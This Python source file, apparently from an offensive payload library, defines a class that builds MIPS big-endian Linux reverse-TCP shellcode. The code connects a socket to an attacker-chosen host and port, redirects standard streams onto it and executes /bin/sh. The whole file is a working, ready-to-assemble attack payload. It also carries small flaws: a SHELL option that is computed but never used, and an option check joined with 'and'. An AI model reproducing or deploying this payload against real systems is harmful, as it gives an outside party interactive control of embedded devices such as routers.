#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.words import Words


class ShellReverseTCP(HatAsm, HatVenom, Words):
    def generate(self, assemble=True, options={}):
        if 'RHOST' not in options and 'RPORT' not in options:
            return b''

        if 'SHELL' in options:
            shell = options['SHELL'].encode()
        else:
            shell = self.shell['sh'].encode()

        shell = shell[::-1]
        rhost = self.convert_host(options['RHOST'], 'big')
        rport = self.convert_port(options['RPORT'], 'big')

        shellcode = f"""
        start:
            addiu $t7, $zero, -6
            not $t7, $t7
            addi $a0, $t7, -3
            addi $a1, $t7, -3
            slti $a2, $zero, -1
            addiu $v0, $zero, 0x1057
            syscall 0x40404

            sw $v0, -1($sp)
            lw $a0, -1($sp)
            ori $t7, $zero, 0xfffd
            not $t7, $t7
            sw $t7, -0x20($sp)
            lui $t6, 0x{rport.hex()}
            ori $t6, $t6, 0x{rport.hex()}
            sw $t6, -0x1c($sp)
            lui $t6, 0x{rhost[:2].hex()}
            ori $t6, $t6, 0x{rhost[2:].hex()}
            sw $t6, -0x1a($sp)
            addiu $a1, $sp, -0x1e
            addiu $t4, $zero, -0x11
            not $a2, $t4
            addiu $v0, $zero, 0x104a
            syscall 0x40404

            addiu $s1, $zero, -3
            not $s1, $s1
            lw $a0, -1($sp)

        dup:
            move $a1, $s1
            addiu $v0, $zero, 0xfdf
            syscall 0x40404

            addiu $s0, $zero, -1
            addi $s1, $s1, -1
            bne $s1, $s0, dup

            slti $a2, $zero, -1
            lui $t7, 0x2f2f
            ori $t7, $t7, 0x6269
            sw $t7, -0x14($sp)
            lui $t6, 0x6e2f
            ori $t6, $t6, 0x7368
            sw $t6, -0x10($sp)
            sw $zero, -0xc($sp)
            addiu $a0, $sp, -0x14
            sw $a0, -8($sp)
            sw $zero, -4($sp)
            addiu $a1, $sp, -8
            addiu $v0, $zero, 0xfab
            syscall 0x40404
        """

        if assemble:
            bytecode = self.assemble('mipsbe', shellcode)
            return bytecode
        return shellcode
